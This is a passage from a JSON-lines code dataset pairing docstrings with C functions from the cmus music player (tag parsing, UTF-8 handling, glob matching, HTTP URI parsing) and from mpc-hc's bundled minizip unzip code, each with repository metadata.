= samples * CHANNELS * sizeof(opus_int16);\n\t\t}\n\t}\n\n\treturn rc;\n}", "path": "cmus/ip/opus.c", "commit_date": "2019-02-11 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/*\n * This returns the number of bytes added to the buffer.\n * It returns < 0 on error.  0 on EOF.\n */\n", "func_signal": "static int ffmpeg_fill_buffer(AVFormatContext *ic, AVCodecContext *cc, struct ffmpeg_input *input,\n\t\t\t      struct ffmpeg_output *output, SwrContext *swr)", "code": "{\n#if LIBAVCODEC_VERSION_MAJOR >= 56\n\tAVFrame *frame = av_frame_alloc();\n#else\n\tAVFrame *frame = avcodec_alloc_frame();\n#endif\n\tint got_frame;\n\twhile (1) {\n\t\tint len;\n\n\t\tif (input->curr_pkt_size <= 0) {\n#if LIBAVCODEC_VERSION_MAJOR >= 56\n\t\t\tav_packet_unref(&input->pkt);\n#else\n\t\t\tav_free_packet(&input->pkt);\n#endif\n\t\t\tif (av_read_frame(ic, &input->pkt) < 0) {\n\t\t\t\t/* Force EOF once we can read no longer. */\n#if LIBAVCODEC_VERSION_MAJOR >= 56\n\t\t\t\tav_frame_free(&frame);\n#else\n\t\t\t\tavcodec_free_frame(&frame);\n#endif\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tif (input->pkt.stream_index == input->stream_index) {\n\t\t\t\tinput->curr_pkt_size = input->pkt.size;\n\t\t\t\tinput->curr_pkt_buf = input->pkt.data;\n\t\t\t\tinput->curr_size += input->pkt.size;\n\t\t\t\tinput->curr_duration += input->pkt.duration;\n\t\t\t}\n\t\t\tcontinue;\n\t\t}\n\n\t\t{\n\t\t\tAVPacket avpkt;\n\t\t\tav_new_packet(&avpkt, input->curr_pkt_size);\n\t\t\tmemcpy(avpkt.data, input->curr_pkt_buf, input->curr_pkt_size);\n#if LIBAVCODEC_VERSION_INT >= AV_VERSION_INT(57, 48, 101)\n\t\t\tif (avcodec_send_packet(cc, &avpkt) == 0) {\n\t\t\t\tgot_frame = !avcodec_receive_frame(cc, frame);\n\t\t\t\tif (got_frame)\n\t\t\t\t\tlen = input->curr_pkt_size;\n\t\t\t\telse\n\t\t\t\t\tlen = 0;\n\t\t\t} else {\n\t\t\t\tgot_frame = 0;\n\t\t\t\tlen = 0;\n\t\t\t}\n#else\n\t\t\tlen = avcodec_decode_audio4(cc, frame, &got_frame, &avpkt);\n#endif\n#if LIBAVCODEC_VERSION_MAJOR >= 56\n\t\t\tav_packet_unref(&avpkt);\n#else\n\t\t\tav_free_packet(&avpkt);\n#endif\n\t\t}\n\t\tif (len < 0) {\n\t\t\t/* this is often reached when seeking, not sure why */\n\t\t\tinput->curr_pkt_size = 0;\n\t\t\tcontinue;\n\t\t}\n\t\tinput->curr_pkt_size -= len;\n\t\tinput->curr_pkt_buf += len;\n\t\tif (got_frame) {\n\t\t\tint res = swr_convert(swr,\n\t\t\t\t\t&output->buffer,\n\t\t\t\t\tframe->nb_samples,\n\t\t\t\t\t(const uint8_t **)frame->extended_data,\n\t\t\t\t\tframe->nb_samples);\n\t\t\tif (res < 0)\n\t\t\t\tres = 0;\n\t\t\toutput->buffer_pos = output->buffer;\n\t\t\toutput->buffer_used_len = res * cc->channels * sizeof(int16_t);\n#if LIBAVCODEC_VERSION_MAJOR >= 56\n\t\t\tav_frame_free(&frame);\n#else\n\t\t\tavcodec_free_frame(&frame);\n#endif\n\t\t\treturn output->buffer_used_len;\n\t\t}\n\t}\n\t/* This should never get here. */\n\treturn -IP_ERROR_INTERNAL;\n}", "path": "cmus/ip/ffmpeg.c", "commit_date": "2019-02-12 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/* only works for BROWSER_ENTRY_DIR and BROWSER_ENTRY_FILE */\n", "func_signal": "static int entry_cmp(const struct browser_entry *a, const struct browser_entry *b)", "code": "{\n\tif (a->type == BROWSER_ENTRY_DIR) {\n\t\tif (b->type == BROWSER_ENTRY_FILE)\n\t\t\treturn -1;\n\t\tif (!strcmp(a->name, \"../\"))\n\t\t\treturn -1;\n\t\tif (!strcmp(b->name, \"../\"))\n\t\t\treturn 1;\n\t\treturn strcmp(a->name, b->name);\n\t}\n\tif (b->type == BROWSER_ENTRY_DIR)\n\t\treturn 1;\n\treturn strcmp(a->name, b->name);\n}", "path": "cmus/browser.c", "commit_date": "2019-02-15 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/* returned key-name must be free'd */\n", "func_signal": "char *ape_get_comment(struct apetag *ape, char **val)", "code": "{\n\tstruct ape_header *h = &ape->header;\n\tchar *key;\n\tint rc;\n\n\tif (ape->pos >= h->size)\n\t\treturn NULL;\n\n\trc = ape_parse_one(ape->buf + ape->pos, h->size - ape->pos, &key, val);\n\tif (rc < 0)\n\t\treturn NULL;\n\tape->pos += rc;\n\n\treturn key;\n}", "path": "cmus/ape.c", "commit_date": "2015-04-27 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/* return the number of comments, or -1 */\n", "func_signal": "int ape_read_tags(struct apetag *ape, int fd, int slow)", "code": "{\n\tstruct ape_header *h = &ape->header;\n\tint rc = -1;\n\toff_t old_pos;\n\n\t/* save position */\n\told_pos = lseek(fd, 0, SEEK_CUR);\n\n\tif (!find_ape_tag(fd, h, slow))\n\t\tgoto fail;\n\n\tif (AF_IS_FOOTER(h->flags)) {\n\t\t/* seek back right after the header */\n\t\tif (lseek(fd, -((int)h->size), SEEK_CUR) == -1)\n\t\t\tgoto fail;\n\t}\n\n\t/* ignore insane tags */\n\tif (h->size > 1024 * 1024)\n\t\tgoto fail;\n\n\tape->buf = xnew(char, h->size);\n\tif (read_all(fd, ape->buf, h->size) != h->size)\n\t\tgoto fail;\n\n\trc = h->count;\n\nfail:\n\tlseek(fd, old_pos, SEEK_SET);\n\treturn rc;\n}", "path": "cmus/ape.c", "commit_date": "2015-04-27 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/* XXXYYY\n *\n * X = [A-Z0-9]\n * Y = byte\n *\n * XXX is frame\n * YYY is frame size excluding this 6 byte header\n */\n", "func_signal": "static int v2_2_0_frame_header_parse(struct v2_frame_header *header, const char *buf)", "code": "{\n\tint i;\n\n\tfor (i = 0; i < 3; i++) {\n\t\tif (!is_frame_id_char(buf[i]))\n\t\t\treturn 0;\n\t\theader->id[i] = buf[i];\n\t}\n\theader->id[3] = 0;\n\tget_u24((const unsigned char *)(buf + 3), &header->size);\n\theader->flags = 0;\n\tif (header->size == 0)\n\t\treturn 0;\n\tid3_debug(\"%c%c%c %d\\n\", header->id[0], header->id[1], header->id[2], header->size);\n\treturn 1;\n}", "path": "cmus/id3.c", "commit_date": "2020-01-19 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/* sets fd right after the header and returns 1 if found,\n * otherwise returns 0\n */\n", "func_signal": "static int find_ape_tag(int fd, struct ape_header *h, int slow)", "code": "{\n\tint pos;\n\n\tif (lseek(fd, -HEADER_SIZE, SEEK_END) == -1)\n\t\treturn 0;\n\tif (read_header(fd, h))\n\t\treturn 1;\n\n\t/* try to skip ID3v1 tag at the end of the file */\n\tif (lseek(fd, -(HEADER_SIZE + 128), SEEK_END) == -1)\n\t\treturn 0;\n\tif (read_header(fd, h))\n\t\treturn 1;\n\n\tif (!slow)\n\t\treturn 0;\n\n\tpos = find_ape_tag_slow(fd);\n\tif (pos == -1)\n\t\treturn 0;\n\tif (lseek(fd, pos, SEEK_SET) == -1)\n\t\treturn 0;\n\treturn read_header(fd, h);\n}", "path": "cmus/ape.c", "commit_date": "2015-04-27 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/*\n * Printing functions, these lose information\n */\n", "func_signal": "void u_set_char(char *str, size_t *idx, uchar uch)", "code": "{\n\tint i = *idx;\n\n\tif (unlikely(uch <= 0x0000001fU))\n\t\tgoto invalid;\n\n\tif (uch <= 0x0000007fU) {\n\t\tstr[i++] = uch;\n\t\t*idx = i;\n\t\treturn;\n\t} else if (uch <= 0x000007ffU) {\n\t\tstr[i + 1] = (uch & 63) | 0x80; uch >>= 6;\n\t\tstr[i + 0] = uch | 0x000000c0U;\n\t\ti += 2;\n\t\t*idx = i;\n\t\treturn;\n\t} else if (uch <= 0x0000ffffU) {\n\t\tstr[i + 2] = (uch & 63) | 0x80; uch >>= 6;\n\t\tstr[i + 1] = (uch & 63) | 0x80; uch >>= 6;\n\t\tstr[i + 0] = uch | 0x000000e0U;\n\t\ti += 3;\n\t\t*idx = i;\n\t\treturn;\n\t} else if (uch <= 0x0010ffffU) {\n\t\tstr[i + 3] = (uch & 63) | 0x80; uch >>= 6;\n\t\tstr[i + 2] = (uch & 63) | 0x80; uch >>= 6;\n\t\tstr[i + 1] = (uch & 63) | 0x80; uch >>= 6;\n\t\tstr[i + 0] = uch | 0x000000f0U;\n\t\ti += 4;\n\t\t*idx = i;\n\t\treturn;\n\t}\ninvalid:\n\t/* control character or invalid unicode */\n\tif (uch == 0) {\n\t\t/* handle this special case here to make the common case fast */\n\t\tstr[i++] = 0;\n\t\t*idx = i;\n\t} else {\n\t\tstr[i++] = '<';\n\t\tstr[i++] = hex_tab[(uch >> 4) & 0xf];\n\t\tstr[i++] = hex_tab[uch & 0xf];\n\t\tstr[i++] = '>';\n\t\t*idx = i;\n\t}\n}", "path": "cmus/uchar.c", "commit_date": "2020-12-17 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/* XXXXYYYYZZ\n *\n * X = [A-Z0-9]\n * Y = byte\n * Z = byte\n *\n * XXXX is frame\n * YYYY is frame size excluding this 10 byte header\n * ZZ   is flags\n */\n", "func_signal": "static int v2_3_0_frame_header_parse(struct v2_frame_header *header, const char *buf)", "code": "{\n\tint i;\n\n\tfor (i = 0; i < 4; i++) {\n\t\tif (!(is_frame_id_char(buf[i]) || (i == 3 && buf[i] == '\\0')))\n\t\t\treturn 0;\n\t\theader->id[i] = buf[i];\n\t}\n\tget_u32((const unsigned char *)(buf + 4), &header->size);\n\theader->flags = (buf[8] << 8) | buf[9];\n\tif (header->size == 0)\n\t\treturn 0;\n\tid3_debug(\"%c%c%c%c %d\\n\", header->id[0], header->id[1], header->id[2],\n\t\t\theader->id[3], header->size);\n\treturn 1;\n}", "path": "cmus/id3.c", "commit_date": "2020-01-19 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/* filter out names starting with '.' except '..' */\n", "func_signal": "static int normal_filter(const char *name, const struct stat *s)", "code": "{\n\tif (name[0] == '.') {\n\t\tif (name[1] == '.' && name[2] == 0)\n\t\t\treturn 1;\n\t\treturn 0;\n\t}\n\tif (S_ISDIR(s->st_mode))\n\t\treturn 1;\n\treturn cmus_is_supported(name);\n}", "path": "cmus/browser.c", "commit_date": "2019-02-15 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/* same as 2.3 but header size is sync safe */\n", "func_signal": "static int v2_4_0_frame_header_parse(struct v2_frame_header *header, const char *buf)", "code": "{\n\tint i;\n\n\tfor (i = 0; i < 4; i++) {\n\t\tif (!(is_frame_id_char(buf[i]) || (i == 3 && buf[i] == '\\0')))\n\t\t\treturn 0;\n\t\theader->id[i] = buf[i];\n\t}\n\tif (!u32_unsync((const unsigned char *)(buf + 4), &header->size))\n\t\treturn 0;\n\theader->flags = (buf[8] << 8) | buf[9];\n\tif (header->size == 0)\n\t\treturn 0;\n\tid3_debug(\"%c%c%c%c %d\\n\", header->id[0], header->id[1], header->id[2],\n\t\t\theader->id[3], header->size);\n\treturn 1;\n}", "path": "cmus/id3.c", "commit_date": "2020-01-19 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/* callbacks */\n", "func_signal": "static mpc_int32_t read_impl(callback_t *data, void *ptr, mpc_int32_t size)", "code": "{\n\tstruct input_plugin_data *ip_data = get_ip_data(data);\n\tint rc;\n\n\trc = read_wrapper(ip_data, ptr, size);\n\tif (rc == -1)\n\t\treturn -1;\n\tif (rc == 0) {\n\t\terrno = 0;\n\t\treturn 0;\n\t}\n\treturn rc;\n}", "path": "cmus/ip/mpc.c", "commit_date": "2019-02-11 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/* expensive */\n", "func_signal": "void list_add_rand(struct list_head *head, struct list_head *node, int nr)", "code": "{\n\tstruct list_head *item;\n\tint pos;\n\n\tpos = rand() % (nr + 1);\n\titem = head;\n\tif (pos <= nr / 2) {\n\t\twhile (pos) {\n\t\t\titem = item->next;\n\t\t\tpos--;\n\t\t}\n\t\t/* add after item */\n\t\tlist_add(node, item);\n\t} else {\n\t\tpos = nr - pos;\n\t\twhile (pos) {\n\t\t\titem = item->prev;\n\t\t\tpos--;\n\t\t}\n\t\t/* add before item */\n\t\tlist_add_tail(node, item);\n\t}\n}", "path": "cmus/track.c", "commit_date": "2016-07-31 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/* simplification:\n *\n *   ??*? => ???*\n *   *?*  => ?*\n *   *?   => ?*\n *   ...\n */\n", "func_signal": "static void simplify(struct list_head *head)", "code": "{\n\tstruct list_head *item;\n\n\titem = head->next;\n\twhile (item != head) {\n\t\tstruct list_head *i, *next;\n\t\tint qcount = 0;\n\t\tint scount = 0;\n\n\t\ti = item;\n\t\tdo {\n\t\t\tstruct glob_item *gi;\n\n\t\t\tgi = container_of(i, struct glob_item, node);\n\t\t\tif (gi->type == GLOB_STAR) {\n\t\t\t\tscount++;\n\t\t\t} else if (gi->type == GLOB_QMARK) {\n\t\t\t\tqcount++;\n\t\t\t} else {\n\t\t\t\ti = i->next;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\ti = i->next;\n\t\t} while (i != head);\n\n\t\tnext = i;\n\n\t\tif (scount) {\n\t\t\t/* move all qmarks to front and\n\t\t\t * if there are >1 stars remove all but the last */\n\t\t\tstruct list_head *insert_after = item->prev;\n\n\t\t\ti = item;\n\t\t\twhile (qcount) {\n\t\t\t\tstruct glob_item *gi;\n\n\t\t\t\tgi = container_of(i, struct glob_item, node);\n\t\t\t\ti = i->next;\n\t\t\t\tif (gi->type == GLOB_QMARK) {\n\t\t\t\t\tlist_del(&gi->node);\n\t\t\t\t\tlist_add(&gi->node, insert_after);\n\t\t\t\t\tqcount--;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\ti = item;\n\t\t\twhile (scount > 1) {\n\t\t\t\tstruct glob_item *gi;\n\n\t\t\t\tgi = container_of(i, struct glob_item, node);\n\t\t\t\ti = i->next;\n\t\t\t\tif (gi->type == GLOB_STAR) {\n\t\t\t\t\tlist_del(&gi->node);\n\t\t\t\t\tfree(gi);\n\t\t\t\t\tscount--;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\titem = next;\n\t}\n}", "path": "cmus/glob.c", "commit_date": "2020-12-17 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/*\n * @uri is http://[user[:pass]@]host[:port][/path][?query]\n *\n * uri(7): If the URL supplies a user  name  but no  password, and the remote\n * server requests a password, the program interpreting the URL should request\n * one from the user.\n */\n", "func_signal": "int http_parse_uri(const char *uri, struct http_uri *u)", "code": "{\n\tconst char *str, *colon, *at, *slash, *host_start;\n\n\t/* initialize all fields */\n\tu->uri  = xstrdup(uri);\n\tu->user = NULL;\n\tu->pass = NULL;\n\tu->host = NULL;\n\tu->path = NULL;\n\tu->port = 80;\n\n\tif (strncmp(uri, \"http://\", 7))\n\t\treturn -1;\n\tstr = uri + 7;\n\thost_start = str;\n\n\t/* [/path] */\n\tslash = strchr(str, '/');\n\tif (slash) {\n\t\tu->path = xstrdup(slash);\n\t} else {\n\t\tu->path = xstrdup(\"/\");\n\t}\n\n\t/* [user[:pass]@] */\n\tat = strchr(str, '@');\n\tif (at && (!slash || at < slash)) {\n\t\t/* user[:pass]@ */\n\t\thost_start = at + 1;\n\t\tcolon = strchr(str, ':');\n\t\tif (colon == NULL || colon > at) {\n\t\t\t/* user */\n\t\t\tu->user = xstrndup(str, at - str);\n\t\t} else {\n\t\t\t/* user:pass */\n\t\t\tu->user = xstrndup(str, colon - str);\n\t\t\tu->pass = xstrndup(colon + 1, at - (colon + 1));\n\t\t}\n\t}\n\n\t/* host[:port] */\n\tcolon = strchr(host_start, ':');\n\tif (colon && (!slash || colon < slash)) {\n\t\t/* host:port */\n\t\tconst char *start;\n\t\tint port;\n\n\t\tu->host = xstrndup(host_start, colon - host_start);\n\t\tcolon++;\n\t\tstart = colon;\n\n\t\tport = 0;\n\t\twhile (*colon >= '0' && *colon <= '9') {\n\t\t\tport *= 10;\n\t\t\tport += *colon - '0';\n\t\t\tcolon++;\n\t\t}\n\t\tu->port = port;\n\n\t\tif (colon == start || (*colon != 0 && *colon != '/')) {\n\t\t\thttp_free_uri(u);\n\t\t\treturn -1;\n\t\t}\n\t} else {\n\t\t/* host */\n\t\tif (slash) {\n\t\t\tu->host = xstrndup(host_start, slash - host_start);\n\t\t} else {\n\t\t\tu->host = xstrdup(host_start);\n\t\t}\n\t}\n\treturn 0;\n}", "path": "cmus/http.c", "commit_date": "2016-02-25 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/*\n * Comparison functions\n */\n", "func_signal": "int u_strcase_equal(const char *a, const char *b)", "code": "{\n\tint ai = 0, bi = 0;\n\n\twhile (a[ai]) {\n\t\tuchar au, bu;\n\n\t\tau = u_get_char(a, &ai);\n\t\tbu = u_get_char(b, &bi);\n\n\t\tif (u_casefold_char(au) != u_casefold_char(bu))\n\t\t\treturn 0;\n\t}\n\n\treturn b[bi] ? 0 : 1;\n}", "path": "cmus/uchar.c", "commit_date": "2020-12-17 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/*\n * Case-folding functions\n */\n", "func_signal": "static inline uchar u_casefold_char(uchar ch)", "code": "{\n\t/* faster lookup for for A-Z, rest of ASCII unaffected */\n\tif (ch < 0x0041)\n\t\treturn ch;\n\tif (ch <= 0x005A)\n\t\treturn ch + 0x20;\n#if defined(_WIN32) || defined(__STDC_ISO_10646__) || defined(__APPLE__)\n\tif (ch < 128)\n\t\treturn ch;\n\tch = towlower(ch);\n#endif\n\treturn ch;\n}", "path": "cmus/uchar.c", "commit_date": "2020-12-17 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/* filter out '.' */\n", "func_signal": "static int hidden_filter(const char *name, const struct stat *s)", "code": "{\n\tif (name[0] == '.' && name[1] == 0)\n\t\treturn 0;\n\treturn 1;\n}", "path": "cmus/browser.c", "commit_date": "2019-02-15 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/*\n * All keys are ASCII and length is 2..255\n *\n * UTF-8:\tArtist, Album, Title, Genre\n * Integer:\tTrack (N or N/M)\n * Date:\tYear (release), \"Record Date\"\n *\n * UTF-8 strings are NOT zero terminated.\n *\n * Also support \"discnumber\" (vorbis) and \"disc\" (non-standard)\n */\n", "func_signal": "static int ape_parse_one(const char *buf, int size, char **keyp, char **valp)", "code": "{\n\tint pos = 0;\n\n\twhile (size - pos > 8) {\n\t\tuint32_t val_len, flags;\n\t\tchar *key, *val;\n\t\tint64_t max_key_len, key_len;\n\n\t\tval_len = read_le32(buf + pos); pos += 4;\n\t\tflags = read_le32(buf + pos); pos += 4;\n\n\t\tmax_key_len = size - pos - (int64_t)val_len - 1;\n\t\tif (max_key_len < 0) {\n\t\t\t/* corrupt */\n\t\t\tbreak;\n\t\t}\n\n\t\tfor (key_len = 0; key_len < max_key_len && buf[pos + key_len]; key_len++)\n\t\t\t; /* nothing */\n\t\tif (buf[pos + key_len]) {\n\t\t\t/* corrupt */\n\t\t\tbreak;\n\t\t}\n\n\t\tif (!AF_IS_UTF8(flags)) {\n\t\t\t/* ignore binary data */\n\t\t\tpos += key_len + 1 + val_len;\n\t\t\tcontinue;\n\t\t}\n\n\t\tkey = xstrdup(buf + pos);\n\t\tpos += key_len + 1;\n\n\t\t/* should not be NUL-terminated */\n\t\tval = xstrndup(buf + pos, val_len);\n\t\tpos += val_len;\n\n\t\t/* could be moved to comment.c but I don't think anyone else would use it */\n\t\tif (!strcasecmp(key, \"record date\") || !strcasecmp(key, \"year\")) {\n\t\t\tfree(key);\n\t\t\tkey = xstrdup(\"date\");\n\t\t}\n\n\t\tif (!strcasecmp(key, \"date\")) {\n\t\t\t/* Date format\n\t\t\t *\n\t\t\t * 1999-08-11 12:34:56\n\t\t\t * 1999-08-11 12:34\n\t\t\t * 1999-08-11\n\t\t\t * 1999-08\n\t\t\t * 1999\n\t\t\t * 1999-W34\t(week 34, totally crazy)\n\t\t\t *\n\t\t\t * convert to year, pl.c supports only years anyways\n\t\t\t *\n\t\t\t * FIXME: which one is the most common tag (year or record date)?\n\t\t\t */\n\t\t\tif (strlen(val) > 4)\n\t\t\t\tval[4] = 0;\n\t\t}\n\n\t\t*keyp = key;\n\t\t*valp = val;\n\t\treturn pos;\n\t}\n\treturn -1;\n}", "path": "cmus/ape.c", "commit_date": "2015-04-27 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/* reads response, ignores fscking carriage returns */\n", "func_signal": "static int http_read_response(int fd, struct gbuf *buf, int timeout_ms)", "code": "{\n\tchar prev = 0;\n\n\tif (read_timeout(fd, timeout_ms))\n\t\treturn -1;\n\twhile (1) {\n\t\tint rc;\n\t\tchar ch;\n\n\t\trc = read(fd, &ch, 1);\n\t\tif (rc == -1) {\n\t\t\treturn -1;\n\t\t}\n\t\tif (rc == 0) {\n\t\t\treturn -2;\n\t\t}\n\t\tif (ch == '\\r')\n\t\t\tcontinue;\n\t\tif (ch == '\\n' && prev == '\\n')\n\t\t\treturn 0;\n\t\tgbuf_add_ch(buf, ch);\n\t\tprev = ch;\n\t}\n}", "path": "cmus/http.c", "commit_date": "2016-02-25 00:00:00", "repo_name": "cmus/cmus", "stars": 5212, "license": "gpl-2.0", "language": "c", "size": 6124}
{"docstring": "/*\n  Set the current file of the zipfile to the next file.\n  return UNZ_OK if there is no problem\n  return UNZ_END_OF_LIST_OF_FILE if the actual file was the latest.\n*/\n", "func_signal": "extern int ZEXPORT unzGoToNextFile (unzFile  file)", "code": "{\n    unz64_s* s;\n    int err;\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_END_OF_LIST_OF_FILE;\n    if (s->gi.number_entry != 0xffff)    /* 2^16 files overflow hack */\n      if (s->num_file+1==s->gi.number_entry)\n        return UNZ_END_OF_LIST_OF_FILE;\n\n    s->pos_in_central_dir += SIZECENTRALDIRITEM + s->cur_file_info.size_filename +\n            s->cur_file_info.size_file_extra + s->cur_file_info.size_file_comment ;\n    s->num_file++;\n    err = unz64local_GetCurrentFileInfoInternal(file,&s->cur_file_info,\n                                               &s->cur_file_info_internal,\n                                               NULL,0,NULL,0,NULL,0);\n    s->current_file_ok = (err == UNZ_OK);\n    return err;\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/*\n  Close the file in zip opened with unzOpenCurrentFile\n  Return UNZ_CRCERROR if all the file was read but the CRC is not good\n*/\n", "func_signal": "extern int ZEXPORT unzCloseCurrentFile (unzFile file)", "code": "{\n    int err=UNZ_OK;\n\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n\n    if ((pfile_in_zip_read_info->rest_read_uncompressed == 0) &&\n        (!pfile_in_zip_read_info->raw))\n    {\n        if (pfile_in_zip_read_info->crc32 != pfile_in_zip_read_info->crc32_wait)\n            err=UNZ_CRCERROR;\n    }\n\n\n    TRYFREE(pfile_in_zip_read_info->read_buffer);\n    pfile_in_zip_read_info->read_buffer = NULL;\n    if (pfile_in_zip_read_info->stream_initialised == Z_DEFLATED)\n        inflateEnd(&pfile_in_zip_read_info->stream);\n#ifdef HAVE_BZIP2\n    else if (pfile_in_zip_read_info->stream_initialised == Z_BZIP2ED)\n        BZ2_bzDecompressEnd(&pfile_in_zip_read_info->bstream);\n#endif\n\n\n    pfile_in_zip_read_info->stream_initialised = 0;\n    TRYFREE(pfile_in_zip_read_info);\n\n    s->pfile_in_zip_read=NULL;\n\n    return err;\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/*\n  Read bytes from the current file.\n  buf contain buffer where data must be copied\n  len the size of buf.\n\n  return the number of byte copied if somes bytes are copied\n  return 0 if the end of file was reached\n  return <0 with error code if there is an error\n    (UNZ_ERRNO for IO error, or zLib error for uncompress error)\n*/\n", "func_signal": "extern int ZEXPORT unzReadCurrentFile  (unzFile file, voidp buf, unsigned len)", "code": "{\n    int err=UNZ_OK;\n    uInt iRead = 0;\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n\n    if (pfile_in_zip_read_info->read_buffer == NULL)\n        return UNZ_END_OF_LIST_OF_FILE;\n    if (len==0)\n        return 0;\n\n    pfile_in_zip_read_info->stream.next_out = (Bytef*)buf;\n\n    pfile_in_zip_read_info->stream.avail_out = (uInt)len;\n\n    if ((len>pfile_in_zip_read_info->rest_read_uncompressed) &&\n        (!(pfile_in_zip_read_info->raw)))\n        pfile_in_zip_read_info->stream.avail_out =\n            (uInt)pfile_in_zip_read_info->rest_read_uncompressed;\n\n    if ((len>pfile_in_zip_read_info->rest_read_compressed+\n           pfile_in_zip_read_info->stream.avail_in) &&\n         (pfile_in_zip_read_info->raw))\n        pfile_in_zip_read_info->stream.avail_out =\n            (uInt)pfile_in_zip_read_info->rest_read_compressed+\n            pfile_in_zip_read_info->stream.avail_in;\n\n    while (pfile_in_zip_read_info->stream.avail_out>0)\n    {\n        if ((pfile_in_zip_read_info->stream.avail_in==0) &&\n            (pfile_in_zip_read_info->rest_read_compressed>0))\n        {\n            uInt uReadThis = UNZ_BUFSIZE;\n            if (pfile_in_zip_read_info->rest_read_compressed<uReadThis)\n                uReadThis = (uInt)pfile_in_zip_read_info->rest_read_compressed;\n            if (uReadThis == 0)\n                return UNZ_EOF;\n            if (ZSEEK64(pfile_in_zip_read_info->z_filefunc,\n                      pfile_in_zip_read_info->filestream,\n                      pfile_in_zip_read_info->pos_in_zipfile +\n                         pfile_in_zip_read_info->byte_before_the_zipfile,\n                         ZLIB_FILEFUNC_SEEK_SET)!=0)\n                return UNZ_ERRNO;\n            if (ZREAD64(pfile_in_zip_read_info->z_filefunc,\n                      pfile_in_zip_read_info->filestream,\n                      pfile_in_zip_read_info->read_buffer,\n                      uReadThis)!=uReadThis)\n                return UNZ_ERRNO;\n\n\n#            ifndef NOUNCRYPT\n            if(s->encrypted)\n            {\n                uInt i;\n                for(i=0;i<uReadThis;i++)\n                  pfile_in_zip_read_info->read_buffer[i] =\n                      zdecode(s->keys,s->pcrc_32_tab,\n                              pfile_in_zip_read_info->read_buffer[i]);\n            }\n#            endif\n\n\n            pfile_in_zip_read_info->pos_in_zipfile += uReadThis;\n\n            pfile_in_zip_read_info->rest_read_compressed-=uReadThis;\n\n            pfile_in_zip_read_info->stream.next_in =\n                (Bytef*)pfile_in_zip_read_info->read_buffer;\n            pfile_in_zip_read_info->stream.avail_in = (uInt)uReadThis;\n        }\n\n        if ((pfile_in_zip_read_info->compression_method==0) || (pfile_in_zip_read_info->raw))\n        {\n            uInt uDoCopy,i ;\n\n            if ((pfile_in_zip_read_info->stream.avail_in == 0) &&\n                (pfile_in_zip_read_info->rest_read_compressed == 0))\n                return (iRead==0) ? UNZ_EOF : iRead;\n\n            if (pfile_in_zip_read_info->stream.avail_out <\n                            pfile_in_zip_read_info->stream.avail_in)\n                uDoCopy = pfile_in_zip_read_info->stream.avail_out ;\n            else\n                uDoCopy = pfile_in_zip_read_info->stream.avail_in ;\n\n            for (i=0;i<uDoCopy;i++)\n                *(pfile_in_zip_read_info->stream.next_out+i) =\n                        *(pfile_in_zip_read_info->stream.next_in+i);\n\n            pfile_in_zip_read_info->total_out_64 = pfile_in_zip_read_info->total_out_64 + uDoCopy;\n\n            